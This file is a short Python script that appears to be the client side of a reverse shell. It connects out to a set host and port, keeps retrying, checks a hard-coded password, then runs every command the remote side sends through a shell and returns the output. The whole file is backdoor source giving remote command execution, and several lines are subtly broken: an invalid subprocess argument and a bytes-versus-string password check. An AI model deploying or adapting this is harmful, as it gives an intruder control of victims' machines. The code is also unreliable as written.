import subprocess
import socket
import os
def cd(newdir):
	global path, cwd
	path = os.path.normpath(f'{path}/{newdir}')
	cwd = os.path.abspath(path)
while True:
	#IP-ENTRY
	ip = socket.gethostname()
	#PORT-ENTRY
	port = 4001
	#PASSWORD-ENTRY
	pswd = 'password'
	srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	path = '.'
	cwd = os.path.abspath(path)
	while True:
		try:
			srvr.connect((ip, port))
			break
		except:
			continue
	while True:
		srvr.send(b'@LOGIN')
		msg = srvr.recv(1024).strip()
		if msg == pswd:
			srvr.send(b'@CONNECTED')
			while True:
				data = srvr.recv(1024)
				msg = data.decode()
				if msg == '@CONFIRM-CONNECTION':
					break
				else:
					continue
			break
		else:
			srvr.send(b'@DENIED')
			continue
	while True:
		breakMainLoop = False
		srvr.send(bytes(f'@GET-INPUT#({cwd})> ', 'utf-8'))
		data = srvr.recv(1024).strip()
		msg = data.decode()
		if msg.find('@PRINT ') == 0 or msg.find('::p ') == 0:
			print(msg[7:])
			continue
		elif msg.replace(' ', '') == '@KILL' or msg.replace(' ', '') == '::k':
			srvr.send(b'Killing Connection...')
			srvr.close()
			del srvr
			breakMainLoop = True
		elif msg.find('cd ') == 0:
			cd(msg[3:])
			continue
		else:
			data = subprocess.call(msg, shell=True, captureOutput=True, cwd=cwd)
			msg = bytes(data, 'utf-8')
			srvr.send(msg)
			continue
		if breakMainLoop:
			break
		else:
			srvr.send(b'Error: Client Issue, main loop condition escape;\nIgnoring...')
			continue